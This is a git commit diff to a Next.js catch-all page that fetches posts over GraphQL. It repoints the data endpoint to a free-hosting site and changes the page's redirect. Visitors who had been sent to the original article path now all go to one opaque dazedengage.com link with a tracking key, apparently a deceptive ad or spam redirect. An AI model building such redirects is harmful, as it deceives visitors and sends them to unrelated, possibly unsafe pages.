58d5e5427e9b24260a9b19bf4540c6236a1c6ca3
thehealthylifepro <134804531+thehealthylifepro@users.noreply.github.com>
2023-05-28 00:20:47 +0500

    Update [...postpath].tsx

--- page/[...postpath].tsx
+++ page/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://alcashzone.com/graphql"
+	const endpoint = "https://thehealthylifepro.000webhostapp.com/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://alcashzone.com/` + encodeURI(path as string)
+					`https://dazedengage.com/swm25hxfa?key=5c300ae0ef17ff8f4d1d1060e89822ec/`
 				}`,
 			},
 		};
